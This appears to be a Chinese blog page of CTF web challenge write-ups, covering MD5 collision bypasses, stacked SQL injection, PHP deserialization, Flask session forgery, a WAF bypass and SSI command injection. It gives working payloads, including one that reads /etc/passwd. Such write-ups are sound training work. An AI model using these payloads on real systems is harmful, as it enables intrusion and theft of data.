<h2 id="（忘记哪题了）-2"><a href="#（忘记哪题了）-2" class="headerlink" title="（忘记哪题了）"></a>（忘记哪题了）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if((string)$_POST[&#39;param1&#39;]!&#x3D;&#x3D;(string)$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">                    die(&quot;success!);&#125;</span><br></pre></td></tr></table></figure>
<p>param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1U%5D%83%60%FB%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB%07%FE%A2</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>
<p>param1[]=QNKCDZO&amp;param2[]=240610708</p>
<hr>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">alter table words rename to word;</span><br><span class="line">将words表重命名为word</span><br><span class="line"></span><br><span class="line">alter table`<span class="number">1919810931114514</span>` rename to words;</span><br><span class="line">将<span class="number">1919810931114514</span>表重命名为words</span><br><span class="line"></span><br><span class="line"><span class="function">alter table words change flag data <span class="title">varchar</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line">将表words（原表<span class="number">1919810931114514</span>）中的列名flag改为data</span><br><span class="line"></span><br><span class="line">alter table words add column id int(10) default 1 --+</span><br><span class="line">在words表中插入id列</span><br></pre></td></tr></table></figure>


<p>预处理语句使用方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> name <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> name;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<p>预定义语句也可以通过变量进行传递:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@tn</span> <span class="operator">=</span> <span class="string">&#x27;hahaha&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span>存储表名</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@sql</span> <span class="operator">=</span> concat(<span class="string">&#x27;select * from &#x27;</span>, <span class="variable">@tn</span>);  <span class="operator">/</span><span class="operator">/</span>存储<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">PREPARE</span> name <span class="keyword">from</span> <span class="variable">@sql</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;;PREPARE jwt from concat(char(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>), &#x27; * from `<span class="number">1919810931114514</span>` &#x27;);EXECUTE jwt;#</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);PREPARE sqla from @sql;EXECUTE sqla;#</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>1.尝试 `‘   ’‘   ）   ))    ‘)     “)     ‘))   “)),找不到字符型注入点</p>
<p>2.输入不等于0的数字返回 1 ；输入过滤了的字符返回 Nonono；输入其他字符空白无显示；</p>
<p>3.尝试堆叠注入，<code>1;show tables;#</code>时返回如下：</p>
<p>   Array ( [0] =&gt; 1) Array ( [0] =&gt; Flag )</p>
<p>推测其执行语句为<code>select GET[&#39;query&#39;] || flag from Flag</code></p>
<p>4.flag被过滤（还有好多都被过滤了哈）</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>.重点来了</span><br><span class="line">oracle 支持 通过 ‘ <span class="string">|| ’ 来实现字符串拼接，但在mysql 不支持。 在mysql里，它只是个 或运算 的符号。或运算符前面是1，则结果为1；或运算符前面是0，则要看后面是1还是0，字符视为0.</span></span><br><span class="line">但是我们可以通过设置 sql_mode=pipes_as_concat; 来使  <span class="string">||  用作拼接的作用</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210413233059.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">在这里我们可以传入  1;<span class="builtin-name">set</span> <span class="attribute">sql_mode</span>=pipes_as_concat;select *,1</span><br><span class="line">其真正的执行语句是  select 1;<span class="builtin-name">set</span> <span class="attribute">sql_mode</span>=pipes_as_concat;select *,1 || flag <span class="keyword">from</span> Flag</span><br><span class="line">这样就可以把 1和flag仪器显示出来</span><br></pre></td></tr></table></figure>


<hr>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line">Tornado框架的附属文件<span class="keyword">handler</span>.settings中存在cookie_secret</span><br></pre></td></tr></table></figure>
<p><a href="https://xz.aliyun.com/t/2908" target="_blank">Python中从服务端模板注入到沙盒逃逸的源码探索 (一)</a></p>
<hr>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">()</span></span> 将变量以字符串形式输出，替代print和echo</span><br><span class="line"><span class="function"><span class="title">chr</span><span class="params">()</span></span> ASCII范围的整数转字符</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span> 顾名思义获取一个文件的内容，替代system(<span class="string">&#x27;cat flag;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 扫描某个目录并将结果以array形式返回，配和var_dump 可以替代system(<span class="string">&#x27;ls;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><a href="https://www.freebuf.com/column/207936.html" target="_blank">利用PHP的字符串解析特性绕过安全防护软件</a></p>
<p>1.利用php字符串解析特性绕过WAF</p>
<p>2.<code>var_dump(scandir(chr(47)))</code>，查看根目录  （ \ 的ascii为47）</p>
<p>发现   [7]=&gt; string(5) “f1agg” </p>
<p>3.file_get_contents()读取文件<br><code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
<hr>
<h2 id="HCTF-2018-admin-Flask-session伪造"><a href="#HCTF-2018-admin-Flask-session伪造" class="headerlink" title="[HCTF 2018]admin  Flask session伪造"></a>[HCTF 2018]admin  Flask session伪造</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">session</span>是浏览器与服务器交互的会话，这个<span class="keyword">session</span>可以来验证访问者的身份，大多数的<span class="keyword">session</span>都是保存在服务器的，但是也有少部分是客户端<span class="keyword">session</span>，比如flask框架。，flask是一个python轻量级web框架，他的<span class="keyword">session</span>存储在客户端的cookie字段中</span><br></pre></td></tr></table></figure>
<p>在该题就是要伪造session，欺骗服务器，假装自己就是admin</p>
<p>从题目给的hint <a href="https://github.com/woadsl1234/hctf_flask/%EF%BC%88change">https://github.com/woadsl1234/hctf_flask/（change</a> password 页面查看源码）</p>
<p>伪造session,需要用来签名的<code>SECRET_KEY</code>，可以在config.py里找到为ckj123</p>
<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank">session加解密脚本</a></p>
<p>这里首先要随便注册一个账号，得到session</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">session</span>=.eJw<span class="number">9</span>kE<span class="number">2</span>LwjAURf_KkLWLNqMbwYUQLS<span class="number">28</span>hEhqyNuI<span class="number">1</span>jpp<span class="number">0</span>jhDq_RD_O_TccDVXRzugXsf<span class="number">5</span>HBpytaS<span class="number">5</span>a<span class="number">25</span>lzNyqM<span class="number">5</span>k-SAfJ<span class="number">7</span>IkoNAJdnYYcgph<span class="number">8</span>yn<span class="number">0</span>thJsb<span class="number">80</span>oKTqYG<span class="number">5</span>XVEDIvNPRCQQeuGECbSDBrRZJZSKae<span class="number">851</span>gsscAFHU<span class="number">6</span>iiTtuUsjrmHkbB<span class="number">2</span>hKhYTH<span class="number">9</span>DZGpzshKo<span class="number">9</span>BjMIlVXA<span class="number">8</span>sGETcwTmHMFMf_zOPTo<span class="number">1</span>gsz-gUE<span class="number">6</span>DnbUB<span class="number">7</span>yFXnOSNE<span class="number">2</span>l<span class="number">8</span>Pt<span class="number">25</span>fX<span class="number">9</span>wROtzUG<span class="number">9</span>CLZVSZIyp<span class="number">2</span>PjN<span class="number">5</span>ZUOkAQUaTdm<span class="number">4</span>c<span class="number">1</span>qinnLhQ-YBy<span class="number">9</span>dJV<span class="number">4</span>fhVvk<span class="number">37</span>WNJT<span class="number">90</span>-uxzABcv<span class="number">25</span>tGRG<span class="number">7</span>m<span class="number">3</span>ZvG<span class="number">4</span>jcUSevxidbLs.Xwb<span class="number">4</span>GQ.icCsKPYayHjgXi<span class="number">1</span>rCcbFCkrVJnI;</span><br></pre></td></tr></table></figure>
<p>解密:<code>python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY</code><br> 加密:<code>python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu4.png"></p>
<p>这里将name的值改为admin</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu5.png"></p>
<p>登入后页面修改伪造的session得到flag</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu6.png"></p>
<hr>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>]；</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><code>file_get_contents</code>可以利用<code>php://input</code>绕过，然后要利用伪协议读取useless.php文件</p>
<p><img src="https://img.npfs06.top/20210307164311.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64解码后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很简单的反序列化</p>
<p>最终payload</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=php://<span class="keyword">input</span>&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">POST:welcome <span class="keyword">to</span> the zjctf</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210307164111.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>ps:这里是file=useless.php而不是file=php://filter/convert.base64-encode/resource=useless.php<br>因为我们要include的是这个页面，不是它的Base64化的源码<br>php://filter/convert.base64-encode/resource=useless.php的作用是读取useless.php页面的源码（经过bae64）</p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu7.png"></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu8.png"></p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要绕过两个地方：</p>
<p>1、is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。</p>
<p>绕过方法：</p>
<p>①PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过</p>
<p>2、__destruct()魔术方法中，op===”2”是强比较，而process()使用的是弱比较op==”2”，可以通过弱类型绕过。</p>
<p>绕过方法：op=2，这里的2是整数int类型，op=2时，op===”2”为false，op==”2”为true</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在不知道flag.php文件路径的时候，可以通过读取系统配置文件、容器配置文件来猜flag的绝对路径。</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">linux提供了/<span class="keyword">proc</span>/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/<span class="keyword">proc</span>/本进程pid/。进程可以通过访问/<span class="keyword">proc</span>/self/目录来获取自己的信息。</span><br><span class="line"></span><br><span class="line">maps 记录一些调用的扩展或者自定义<span class="title"> so</span> 文件</span><br><span class="line"></span><br><span class="line">environ 环境变量</span><br><span class="line"></span><br><span class="line">comm 当前进程运行的程序</span><br><span class="line"></span><br><span class="line">cmdline 程序运行的绝对路径</span><br><span class="line"></span><br><span class="line">cpuset<span class="title"> docker</span> 环境可以看<span class="title"> machine</span> ID</span><br><span class="line"></span><br><span class="line">cgroup<span class="title"> docker环境下全是</span> machine<span class="title"> ID</span> 不太常用</span><br></pre></td></tr></table></figure>


<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>源码.swp泄露，通过审计，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i)).startswith(<span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>爆破得到密码为2020666，先测试一下网站基本功能，用户名aaa，密码2020666登录进去，在network处获得文件路径（抓包也可以看到），文件后缀为shtml</p>
<p><img src="https://img.npfs06.top/20210326235216.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>ssi注入</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（<span class="meta">#<span class="meta-keyword">include</span>），此时服务器会将SHTML中包含的SSI指令解</span></span><br><span class="line">释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用<span class="meta">#<span class="meta-keyword">include</span>引用进来。</span></span><br></pre></td></tr></table></figure>
<p>看到后缀为shtml，可考虑尝试</p>
<p><strong>利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令&lt;#exec&gt;</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>Nmap的文件读写操作</strong></li>
<li><strong>escapeshellarg() + escapeshellcmd（）函数的使用</strong></li>
</ol>
<p>nmap的输出文件选项：</p>
<ul>
<li>-oN 标准保存</li>
<li>-oX XML保存</li>
<li>-oG Grep保存</li>
<li>-oA 保存到所有格式</li>
<li>-append-output 补充保存文件</li>
</ul>
